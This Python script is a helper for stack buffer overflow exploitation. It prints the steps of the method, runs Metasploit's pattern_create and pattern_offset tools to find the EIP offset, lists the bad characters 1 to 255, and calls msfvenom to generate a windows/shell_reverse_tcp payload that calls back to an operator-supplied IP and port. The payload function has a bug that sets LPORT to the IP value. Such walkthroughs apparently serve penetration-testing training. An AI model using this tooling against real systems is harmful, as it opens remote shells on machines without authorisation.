import subprocess
import sys


def menu():
    print("####################################")
    print("# Steps to Conduct Buffer Overflow #")
    print("####################################")
    print("1. Fuzzing")
    print("   [a] Send bytes of data in increments of 100 bytes")
    print("   [b] Wait for crash and note the byte count")
    print("2. Find the Offset")
    print("   [a] Send unique bytes the same length noted in step 1.b")
    print("   [b] Copy unique bytes in EIP")
    print("   [c] Find offset by passing in the length (noted 1.b) and unique bytes found in 2.b")
    print("3. Overwrite the EIP")
    print("   [a] Once we have the offset send ‘A’s the same size as offset, then four ‘B’s to make sure" +
          "we have control of eip example: shell_code = 'A' * 2003 + 'B' * 4 ")
    print("   [b] The eip should be overwritten with ‘42424242’ (if not redo step 2)")
    print("4. Find bad characters")
    print("   [a] Send all possible 255 characters in hex and look for abnormal characters " +
          "(updated code may look something like this: buffer = 'A' * 2606 + 'B' * 4 + badchars)")
    print("5. Find the right module")
    print("6. Generate shell code")
    print("7. You already know\n")


def finding_offset():
    pattern_create = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb"
    pattern_offset = "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb"
    switch_byte_length = "-l"
    switch_unique_bytes = "-q"

    byte_count = input("[+] Paste byte count:")
    byte_count = str(byte_count)

    print("\n")
    subprocess.call([pattern_create, switch_byte_length, byte_count])
    print("\n")

    unique_bytes = input("[+] Paste unique bytes found in EIP:")
    unique_bytes = str(unique_bytes)

    print("\n")
    subprocess.call([pattern_offset, switch_byte_length, byte_count, switch_unique_bytes, unique_bytes])


def bad_characters():
    print("\n[+] Bad Characters 1-255\n")

    for chars in range(1, 256):
        sys.stdout.write("\\x" + '{:02x}'.format(chars))

    print("\n")


def generate_payload():
    ip = input("[*] Enter LHOST (ip of your machine):")
    port = input("[*] Enter LPORT (port you want reverse to call back to):")
    badchars = input("[*] Enter badcharacters found in step 4:")

    msfvenom = "msfvenom"
    switch_payload = "-p"
    payload = "windows/shell_reverse_tcp"
    lhost = f"LHOST={ip}"
    lport = f"LPORT={ip}"
    no_crash = "EXITFUNC=thread"
    switch_format = "-f"
    format = "c"
    switch_architecture = "-a"
    architecture = "x86"
    switch_badchars = "-b"

    subprocess.call(
        [msfvenom, switch_payload, payload, lhost, lport, no_crash, switch_format, format, switch_architecture,
         architecture, switch_badchars, badchars])


def main():
    menu()

    finding_offset()

    bad_characters()

    generate_payload()


if __name__ == '__main__':
    main()